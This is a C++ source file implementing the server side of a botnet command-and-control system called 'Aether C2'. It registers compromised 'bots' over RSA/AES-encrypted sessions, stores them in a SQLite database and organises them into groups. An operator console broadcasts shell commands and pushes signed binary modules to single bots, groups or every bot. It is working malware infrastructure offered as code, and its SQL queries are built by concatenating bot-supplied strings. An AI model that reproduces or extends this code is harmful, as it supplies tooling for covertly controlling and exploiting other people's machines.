#include "c2_server_fixed.hpp"
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <sstream>
#include <random>
#include <algorithm>
#include <vector>
#include <filesystem>
#include <chrono>
#include <fstream>

// Generate self-signed certificate for module verification
void generate_self_signed_cert(RSA* rsa, X509** x509) {
    *x509 = X509_new();
    X509_set_version(*x509, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(*x509), time(NULL));
    X509_gmtime_adj(X509_get_notBefore(*x509), 0);
    X509_gmtime_adj(X509_get_notAfter(*x509), 31536000L); // 1 year validity

    EVP_PKEY* pkey = EVP_PKEY_new();
    EVP_PKEY_assign_RSA(pkey, RSAPrivateKey_dup(rsa));
    X509_set_pubkey(*x509, pkey);

    X509_NAME* name = X509_get_subject_name(*x509);
    X509_NAME_add_entry_by_txt(name, "C", MBSTRING_ASC, (unsigned char*)"US", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "O", MBSTRING_ASC, (unsigned char*)"Aether", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char*)"localhost", -1, -1, 0);
    X509_set_issuer_name(*x509, name);

    X509_sign(*x509, pkey, EVP_sha256());
    EVP_PKEY_free(pkey);
}

C2Core::C2Core() : server_fd_(-1), rsa_keypair_(nullptr), certificate_(nullptr), db_(nullptr), running_(false) {
    if (!initialize_rsa()) throw std::runtime_error("Failed to initialize RSA keypair");
    generate_self_signed_cert(rsa_keypair_, &certificate_);
    init_database();
}

C2Core::~C2Core() {
    stop();
    if (rsa_keypair_) RSA_free(rsa_keypair_);
    if (certificate_) X509_free(certificate_);
    if (server_fd_ != -1) close(server_fd_);
    if (db_) sqlite3_close(db_);
}

bool C2Core::initialize_rsa() {
    BIGNUM *bne = BN_new();
    if (BN_set_word(bne, RSA_F4) != 1) {
        BN_free(bne);
        return false;
    }
    
    rsa_keypair_ = RSA_new();
    if (RSA_generate_key_ex(rsa_keypair_, aether::RSA_KEY_BITS, bne, NULL) != 1) {
        RSA_free(rsa_keypair_);
        rsa_keypair_ = nullptr;
        BN_free(bne);
        return false;
    }
    
    BN_free(bne);
    return true;
}

std::string C2Core::get_public_key_pem() {
    BIO* bio = BIO_new(BIO_s_mem());
    PEM_write_bio_RSAPublicKey(bio, rsa_keypair_);
    
    char* data;
    long len = BIO_get_mem_data(bio, &data);
    std::string pem(data, len);
    BIO_free(bio);
    
    return pem;
}

std::string C2Core::get_cert_pem() {
    BIO* bio = BIO_new(BIO_s_mem());
    PEM_write_bio_X509(bio, certificate_);
    
    char* data;
    long len = BIO_get_mem_data(bio, &data);
    std::string pem(data, len);
    BIO_free(bio);
    
    return pem;
}

void C2Core::run() {
    running_ = true;
    
    // Start worker threads
    db_thread_ = std::thread(&C2Core::db_writer_thread, this);
    task_dispatcher_thread_ = std::thread(&C2Core::task_dispatcher_thread, this);
    heartbeat_monitor_thread_ = std::thread(&C2Core::heartbeat_monitor_thread, this);

    server_fd_ = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd_ == -1) throw std::runtime_error("Failed to create socket");

    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(aether::C2_BOT_PORT);
    int optval = 1;
    setsockopt(server_fd_, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    if (bind(server_fd_, (sockaddr*)&address, sizeof(address)) < 0) {
        throw std::runtime_error("Failed to bind to port " + std::to_string(aether::C2_BOT_PORT));
    }
    if (listen(server_fd_, 10) < 0) throw std::runtime_error("Failed to listen");

    std::cout << "[C2] Server listening on port " << aether::C2_BOT_PORT << std::endl;
    listener_thread();
}

void C2Core::stop() {
    if (!running_) return;
    running_ = false;
    
    // Close server socket to break accept() loop
    if (server_fd_ != -1) {
        close(server_fd_);
        server_fd_ = -1;
    }
    
    // Stop all bot sessions
    {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        for (auto& [bot_id, session] : active_sessions_) {
            session->active = false;
            close(session->socket);
            if (session->session_thread.joinable()) {
                session->session_thread.join();
            }
        }
        active_sessions_.clear();
    }
    
    // Notify and join worker threads
    task_queue_cv_.notify_all();
    db_cond_.notify_all();
    
    if (db_thread_.joinable()) db_thread_.join();
    if (task_dispatcher_thread_.joinable()) task_dispatcher_thread_.join();
    if (heartbeat_monitor_thread_.joinable()) heartbeat_monitor_thread_.join();
}

void C2Core::init_database() {
    if (sqlite3_open("c2_eternal.db", &db_)) {
        throw std::runtime_error("Can't open database: " + std::string(sqlite3_errmsg(db_)));
    }
    
    const char* schema = 
        "CREATE TABLE IF NOT EXISTS bots("
        "id TEXT PRIMARY KEY, "
        "os_info TEXT, "
        "last_heartbeat INTEGER, "
        "is_active INTEGER DEFAULT 0"
        ");"
        "CREATE TABLE IF NOT EXISTS groups("
        "name TEXT PRIMARY KEY"
        ");"
        "CREATE TABLE IF NOT EXISTS group_members("
        "group_name TEXT, "
        "bot_id TEXT, "
        "UNIQUE(group_name, bot_id)"
        ");"
        "CREATE TABLE IF NOT EXISTS modules("
        "name TEXT PRIMARY KEY, "
        "data BLOB, "
        "signature BLOB"
        ");"
        "CREATE TABLE IF NOT EXISTS task_history("
        "id INTEGER PRIMARY KEY AUTOINCREMENT, "
        "bot_id TEXT, "
        "task_type INTEGER, "
        "task_data TEXT, "
        "timestamp INTEGER, "
        "status TEXT"
        ");"
        "UPDATE bots SET is_active = 0;"; // Mark all bots as inactive on startup
    
    char* err_msg = 0;
    if (sqlite3_exec(db_, schema, 0, 0, &err_msg) != SQLITE_OK) {
        std::string error = "SQL error: " + std::string(err_msg);
        sqlite3_free(err_msg);
        throw std::runtime_error(error);
    }
}

void C2Core::queue_db_query(const std::string& query) {
    std::lock_guard<std::mutex> lock(db_queue_mutex_);
    db_queue_.push(query);
    db_cond_.notify_one();
}

void C2Core::db_writer_thread() {
    while (running_) {
        std::unique_lock<std::mutex> lock(db_queue_mutex_);
        db_cond_.wait(lock, [this]{ return !db_queue_.empty() || !running_; });
        
        if (!running_ && db_queue_.empty()) return;

        std::string query = db_queue_.front();
        db_queue_.pop();
        lock.unlock();

        char* err_msg = 0;
        if (sqlite3_exec(db_, query.c_str(), 0, 0, &err_msg) != SQLITE_OK) {
            std::cerr << "[DB] Error: " << sqlite3_errmsg(db_) << std::endl;
            sqlite3_free(err_msg);
        }
    }
}

void C2Core::listener_thread() {
    while (running_) {
        int client_socket = accept(server_fd_, nullptr, nullptr);
        if (client_socket < 0) {
            if (running_) {
                std::cerr << "[C2] Accept failed" << std::endl;
            }
            continue;
        }
        
        std::thread(&C2Core::handle_connection, this, client_socket).detach();
    }
}

void C2Core::handle_connection(int client_socket) {
    // Send handshake data (public key + certificate)
    std::string key_pem = get_public_key_pem();
    std::string cert_pem = get_cert_pem();
    std::string handshake_data = key_pem + cert_pem;
    
    if (send(client_socket, handshake_data.c_str(), handshake_data.length(), 0) < 0) {
        close(client_socket);
        return;
    }
    
    // Receive encrypted AES key
    unsigned char encrypted_key[aether::RSA_KEY_BITS / 8];
    int key_len = recv(client_socket, encrypted_key, sizeof(encrypted_key), 0);
    if (key_len <= 0) {
        close(client_socket);
        return;
    }
    
    // Decrypt AES key
    unsigned char aes_key[aether::AES_KEY_BITS / 8];
    int decrypted_len = RSA_private_decrypt(key_len, encrypted_key, aes_key, rsa_keypair_, RSA_PKCS1_OAEP_PADDING);
    if (decrypted_len != sizeof(aes_key)) {
        close(client_socket);
        return;
    }
    
    // Wait for registration message
    aether::Header header;
    if (recv(client_socket, &header, sizeof(header), 0) <= 0) {
        close(client_socket);
        return;
    }
    
    if (header.type != aether::MSG_C2S_REGISTER) {
        close(client_socket);
        return;
    }
    
    std::vector<char> encrypted_data(header.length - sizeof(header));
    if (recv(client_socket, encrypted_data.data(), encrypted_data.size(), 0) <= 0) {
        close(client_socket);
        return;
    }
    
    std::vector<char> decrypted_data = aether::verify_and_decrypt(encrypted_data, aes_key);
    if (decrypted_data.empty()) {
        close(client_socket);
        return;
    }
    
    std::string bot_id = aether::deserialize_string(decrypted_data);
    
    // Create session
    auto session = std::make_shared<BotSession>(client_socket, bot_id);
    memcpy(session->aes_key, aes_key, sizeof(aes_key));
    
    {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        active_sessions_[bot_id] = session;
    }
    
    // Send registration acknowledgment
    aether::Header ack_header;
    ack_header.type = aether::MSG_S2C_REG_ACK;
    ack_header.length = sizeof(ack_header);
    send(client_socket, &ack_header, sizeof(ack_header), 0);
    
    // Update database
    std::stringstream query;
    query << "INSERT OR REPLACE INTO bots (id, last_heartbeat, is_active) VALUES ('"
          << bot_id << "', " << time(NULL) << ", 1);";
    queue_db_query(query.str());
    
    std::cout << "[C2] Bot registered: " << bot_id << std::endl;
    
    // Start session thread
    session->session_thread = std::thread(&C2Core::handle_bot_session, this, session);
}

void C2Core::handle_bot_session(std::shared_ptr<BotSession> session) {
    while (session->active && running_) {
        aether::Header header;
        int n = recv(session->socket, &header, sizeof(header), 0);
        if (n <= 0) break;

        std::vector<char> encrypted_data(header.length - sizeof(header));
        n = recv(session->socket, encrypted_data.data(), encrypted_data.size(), 0);
        if (n <= 0) break;

        std::vector<char> decrypted_data = aether::verify_and_decrypt(encrypted_data, session->aes_key);
        if (decrypted_data.empty()) {
            std::cerr << "[C2] HMAC verification failed for bot " << session->bot_id << std::endl;
            continue;
        }

        switch (header.type) {
            case aether::MSG_C2S_HEARTBEAT:
                handle_heartbeat(session, decrypted_data);
                break;
            case aether::MSG_C2S_TASK_OUTPUT:
                handle_task_output(session, decrypted_data);
                break;
            default:
                std::cerr << "[C2] Unknown message type: " << (int)header.type << std::endl;
                break;
        }
    }
    
    // Cleanup session
    session->active = false;
    close(session->socket);
    
    {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        active_sessions_.erase(session->bot_id);
    }
    
    // Update database
    std::stringstream query;
    query << "UPDATE bots SET is_active = 0 WHERE id = '" << session->bot_id << "';";
    queue_db_query(query.str());
    
    std::cout << "[C2] Bot disconnected: " << session->bot_id << std::endl;
}

void C2Core::handle_heartbeat(std::shared_ptr<BotSession> session, const std::vector<char>& data) {
    session->last_heartbeat = std::chrono::steady_clock::now();
    session->os_info = aether::deserialize_string(data);
    
    std::stringstream query;
    query << "UPDATE bots SET last_heartbeat = " << time(NULL) 
          << ", os_info = '" << session->os_info << "' WHERE id = '" << session->bot_id << "';";
    queue_db_query(query.str());
}

void C2Core::handle_task_output(std::shared_ptr<BotSession> session, const std::vector<char>& data) {
    std::string output = aether::deserialize_string(data);
    std::cout << "[OUTPUT:" << session->bot_id << "] " << output << std::endl;
    
    // Log to database
    std::stringstream query;
    query << "INSERT INTO task_history (bot_id, task_type, task_data, timestamp, status) VALUES ('"
          << session->bot_id << "', 0, '" << output << "', " << time(NULL) << ", 'completed');";
    queue_db_query(query.str());
}

void C2Core::task_dispatcher_thread() {
    while (running_) {
        std::unique_lock<std::mutex> lock(task_queue_mutex_);
        task_queue_cv_.wait(lock, [this]{ return !pending_tasks_.empty() || !running_; });
        
        if (!running_ && pending_tasks_.empty()) return;
        
        TaskQueue task = pending_tasks_.front();
        pending_tasks_.pop();
        lock.unlock();
        
        // Find target session
        std::lock_guard<std::mutex> session_lock(sessions_mutex_);
        auto it = active_sessions_.find(task.target_bot_id);
        if (it != active_sessions_.end() && it->second->active) {
            // Send task
            std::vector<char> encrypted_payload = aether::encrypt_and_sign(task.task_data, it->second->aes_key);
            aether::Header header;
            header.type = task.task_type;
            header.length = sizeof(header) + encrypted_payload.size();
            
            send(it->second->socket, &header, sizeof(header), 0);
            send(it->second->socket, encrypted_payload.data(), encrypted_payload.size(), 0);
            
            std::cout << "[C2] Task sent to " << task.target_bot_id << std::endl;
        } else {
            std::cerr << "[C2] Bot not found or inactive: " << task.target_bot_id << std::endl;
        }
    }
}

void C2Core::heartbeat_monitor_thread() {
    while (running_) {
        std::this_thread::sleep_for(std::chrono::seconds(30));
        cleanup_inactive_sessions();
    }
}

void C2Core::cleanup_inactive_sessions() {
    auto now = std::chrono::steady_clock::now();
    auto timeout = std::chrono::seconds(120); // 2 minute timeout
    
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    for (auto it = active_sessions_.begin(); it != active_sessions_.end();) {
        if (now - it->second->last_heartbeat > timeout) {
            std::cout << "[C2] Bot timeout: " << it->first << std::endl;
            it->second->active = false;
            close(it->second->socket);
            
            std::stringstream query;
            query << "UPDATE bots SET is_active = 0 WHERE id = '" << it->first << "';";
            queue_db_query(query.str());
            
            it = active_sessions_.erase(it);
        } else {
            ++it;
        }
    }
}

void C2Core::queue_task(const std::string& bot_id, uint8_t task_type, const std::vector<char>& data) {
    TaskQueue task;
    task.target_bot_id = bot_id;
    task.task_type = task_type;
    task.task_data = data;
    task.created = std::chrono::steady_clock::now();
    
    std::lock_guard<std::mutex> lock(task_queue_mutex_);
    pending_tasks_.push(task);
    task_queue_cv_.notify_one();
}

void C2Core::send_task_to_bot(const std::string& bot_id, uint8_t task_type, const std::vector<char>& data) {
    queue_task(bot_id, task_type, data);
}

void C2Core::send_task_to_group(const std::string& group_name, uint8_t task_type, const std::vector<char>& data) {
    auto members = get_group_members(group_name);
    for (const auto& bot_id : members) {
        queue_task(bot_id, task_type, data);
    }
}

void C2Core::send_task_to_all(uint8_t task_type, const std::vector<char>& data) {
    auto bots = get_active_bots();
    for (const auto& bot_id : bots) {
        queue_task(bot_id, task_type, data);
    }
}

std::vector<std::string> C2Core::get_active_bots() {
    std::vector<std::string> bots;
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    for (const auto& [bot_id, session] : active_sessions_) {
        if (session->active) {
            bots.push_back(bot_id);
        }
    }
    return bots;
}

void C2Core::create_group(const std::string& group_name) {
    std::stringstream query;
    query << "INSERT OR IGNORE INTO groups (name) VALUES ('" << group_name << "');";
    queue_db_query(query.str());
}

void C2Core::add_bot_to_group(const std::string& group_name, const std::string& bot_id) {
    std::stringstream query;
    query << "INSERT OR IGNORE INTO group_members (group_name, bot_id) VALUES ('" 
          << group_name << "', '" << bot_id << "');";
    queue_db_query(query.str());
}

void C2Core::remove_bot_from_group(const std::string& group_name, const std::string& bot_id) {
    std::stringstream query;
    query << "DELETE FROM group_members WHERE group_name = '" << group_name 
          << "' AND bot_id = '" << bot_id << "';";
    queue_db_query(query.str());
}

std::vector<std::string> C2Core::get_groups() {
    std::vector<std::string> groups;
    const char* query = "SELECT name FROM groups;";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db_, query, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            groups.push_back((char*)sqlite3_column_text(stmt, 0));
        }
    }
    sqlite3_finalize(stmt);
    
    return groups;
}

std::vector<std::string> C2Core::get_group_members(const std::string& group_name) {
    std::vector<std::string> members;
    std::stringstream query;
    query << "SELECT bot_id FROM group_members WHERE group_name = '" << group_name << "';";
    
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db_, query.str().c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            members.push_back((char*)sqlite3_column_text(stmt, 0));
        }
    }
    sqlite3_finalize(stmt);
    
    return members;
}

void C2Core::load_module_from_file(const std::string& module_name, const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file) {
        std::cerr << "[C2] Failed to open module file: " << filepath << std::endl;
        return;
    }
    
    std::vector<char> module_data((std::istreambuf_iterator<char>(file)),
                                  std::istreambuf_iterator<char>());
    
    // Sign the module
    unsigned char signature[256];
    unsigned int sig_len;
    EVP_PKEY* priv_key = EVP_PKEY_new();
    EVP_PKEY_assign_RSA(priv_key, RSAPrivateKey_dup(rsa_keypair_));
    
    EVP_MD_CTX* md_ctx = EVP_MD_CTX_new();
    EVP_SignInit(md_ctx, EVP_sha256());
    EVP_SignUpdate(md_ctx, module_data.data(), module_data.size());
    EVP_SignFinal(md_ctx, signature, &sig_len, priv_key);
    EVP_MD_CTX_free(md_ctx);
    EVP_PKEY_free(priv_key);
    
    // Store in database
    sqlite3_stmt* stmt;
    const char* query = "INSERT OR REPLACE INTO modules (name, data, signature) VALUES (?, ?, ?);";
    if (sqlite3_prepare_v2(db_, query, -1, &stmt, NULL) == SQLITE_OK) {
        sqlite3_bind_text(stmt, 1, module_name.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_blob(stmt, 2, module_data.data(), module_data.size(), SQLITE_STATIC);
        sqlite3_bind_blob(stmt, 3, signature, sig_len, SQLITE_STATIC);
        sqlite3_step(stmt);
    }
    sqlite3_finalize(stmt);
    
    std::cout << "[C2] Module loaded: " << module_name << " (" << module_data.size() << " bytes)" << std::endl;
}

void C2Core::deploy_module(const std::string& module_name, const std::string& target) {
    // Retrieve module from database
    sqlite3_stmt* stmt;
    const char* query = "SELECT data, signature FROM modules WHERE name = ?;";
    if (sqlite3_prepare_v2(db_, query, -1, &stmt, NULL) != SQLITE_OK) {
        return;
    }
    
    sqlite3_bind_text(stmt, 1, module_name.c_str(), -1, SQLITE_STATIC);
    if (sqlite3_step(stmt) != SQLITE_ROW) {
        sqlite3_finalize(stmt);
        std::cerr << "[C2] Module not found: " << module_name << std::endl;
        return;
    }
    
    // Extract module data and signature
    const void* module_data = sqlite3_column_blob(stmt, 0);
    int module_size = sqlite3_column_bytes(stmt, 0);
    const void* signature = sqlite3_column_blob(stmt, 1);
    int sig_size = sqlite3_column_bytes(stmt, 1);
    
    // Prepare deployment payload: [module_name] [signature] [module_data]
    std::vector<char> payload;
    payload.insert(payload.end(), module_name.begin(), module_name.end());
    payload.push_back('\0'); // Null terminator
    payload.insert(payload.end(), (char*)signature, (char*)signature + sig_size);
    payload.insert(payload.end(), (char*)module_data, (char*)module_data + module_size);
    
    sqlite3_finalize(stmt);
    
    // Send to target(s)
    if (target == "all") {
        send_task_to_all(aether::MSG_S2C_LOAD_MODULE, payload);
    } else if (target.substr(0, 6) == "group:") {
        std::string group_name = target.substr(6);
        send_task_to_group(group_name, aether::MSG_S2C_LOAD_MODULE, payload);
    } else {
        send_task_to_bot(target, aether::MSG_S2C_LOAD_MODULE, payload);
    }
    
    std::cout << "[C2] Module deployed: " << module_name << " -> " << target << std::endl;
}

// OperatorConsole Implementation
OperatorConsole::OperatorConsole(C2Core& core) : core_(core) {}

void OperatorConsole::run() {
    std::cout << "\n=== AETHER C2 CONSOLE ===" << std::endl;
    print_help();
    
    std::string line;
    while (std::cout << "\naether> " && std::getline(std::cin, line)) {
        if (line.empty()) continue;
        
        std::istringstream iss(line);
        std::string command;
        iss >> command;
        
        if (command == "help") {
            print_help();
        } else if (command == "bots") {
            list_bots();
        } else if (command == "groups") {
            list_groups();
        } else if (command == "create") {
            std::string group_name;
            iss >> group_name;
            if (!group_name.empty()) {
                create_group(group_name);
            } else {
                std::cout << "Usage: create <group_name>" << std::endl;
            }
        } else if (command == "add") {
            std::string group_name, bot_id;
            iss >> group_name >> bot_id;
            if (!group_name.empty() && !bot_id.empty()) {
                manage_group("add", group_name, bot_id);
            } else {
                std::cout << "Usage: add <group_name> <bot_id>" << std::endl;
            }
        } else if (command == "remove") {
            std::string group_name, bot_id;
            iss >> group_name >> bot_id;
            if (!group_name.empty() && !bot_id.empty()) {
                manage_group("remove", group_name, bot_id);
            } else {
                std::cout << "Usage: remove <group_name> <bot_id>" << std::endl;
            }
        } else if (command == "cmd") {
            std::string target;
            iss >> target;
            std::string cmd_line;
            std::getline(iss, cmd_line);
            if (!target.empty() && !cmd_line.empty()) {
                send_command(target, cmd_line.substr(1)); // Remove leading space
            } else {
                std::cout << "Usage: cmd <target> <command>" << std::endl;
            }
        } else if (command == "load") {
            std::string module_name, filepath;
            iss >> module_name >> filepath;
            if (!module_name.empty() && !filepath.empty()) {
                load_module(module_name, filepath);
            } else {
                std::cout << "Usage: load <module_name> <filepath>" << std::endl;
            }
        } else if (command == "deploy") {
            std::string module_name, target;
            iss >> module_name >> target;
            if (!module_name.empty() && !target.empty()) {
                deploy_module(module_name, target);
            } else {
                std::cout << "Usage: deploy <module_name> <target>" << std::endl;
            }
        } else if (command == "exit" || command == "quit") {
            break;
        } else {
            std::cout << "Unknown command: " << command << std::endl;
        }
    }
}

void OperatorConsole::print_help() {
    std::cout << "\nAvailable Commands:" << std::endl;
    std::cout << "  bots                     - List active bots" << std::endl;
    std::cout << "  groups                   - List all groups" << std::endl;
    std::cout << "  create <group_name>      - Create a new group" << std::endl;
    std::cout << "  add <group> <bot_id>     - Add bot to group" << std::endl;
    std::cout << "  remove <group> <bot_id>  - Remove bot from group" << std::endl;
    std::cout << "  cmd <target> <command>   - Execute command (target: bot_id, group:name, or all)" << std::endl;
    std::cout << "  load <name> <file>       - Load module from file" << std::endl;
    std::cout << "  deploy <module> <target> - Deploy module to target" << std::endl;
    std::cout << "  help                     - Show this help" << std::endl;
    std::cout << "  exit                     - Exit console" << std::endl;
}

void OperatorConsole::list_bots() {
    auto bots = core_.get_active_bots();
    std::cout << "\nActive Bots (" << bots.size() << "):" << std::endl;
    for (const auto& bot_id : bots) {
        std::cout << "  " << bot_id << std::endl;
    }
}

void OperatorConsole::list_groups() {
    auto groups = core_.get_groups();
    std::cout << "\nGroups (" << groups.size() << "):" << std::endl;
    for (const auto& group : groups) {
        auto members = core_.get_group_members(group);
        std::cout << "  " << group << " (" << members.size() << " members)" << std::endl;
        for (const auto& member : members) {
            std::cout << "    - " << member << std::endl;
        }
    }
}

void OperatorConsole::create_group(const std::string& name) {
    core_.create_group(name);
    std::cout << "Group created: " << name << std::endl;
}

void OperatorConsole::manage_group(const std::string& action, const std::string& group_name, const std::string& bot_id) {
    if (action == "add") {
        core_.add_bot_to_group(group_name, bot_id);
        std::cout << "Added " << bot_id << " to group " << group_name << std::endl;
    } else if (action == "remove") {
        core_.remove_bot_from_group(group_name, bot_id);
        std::cout << "Removed " << bot_id << " from group " << group_name << std::endl;
    }
}

void OperatorConsole::send_command(const std::string& target, const std::string& command) {
    std::vector<char> cmd_data(command.begin(), command.end());
    
    if (target == "all") {
        core_.send_task_to_all(aether::MSG_S2C_NEW_TASK, cmd_data);
    } else if (target.substr(0, 6) == "group:") {
        std::string group_name = target.substr(6);
        core_.send_task_to_group(group_name, aether::MSG_S2C_NEW_TASK, cmd_data);
    } else {
        core_.send_task_to_bot(target, aether::MSG_S2C_NEW_TASK, cmd_data);
    }
    
    std::cout << "Command sent to " << target << ": " << command << std::endl;
}

void OperatorConsole::deploy_module(const std::string& module_name, const std::string& target) {
    core_.deploy_module(module_name, target);
}

void OperatorConsole::load_module(const std::string& module_name, const std::string& filepath) {
    core_.load_module_from_file(module_name, filepath);
}
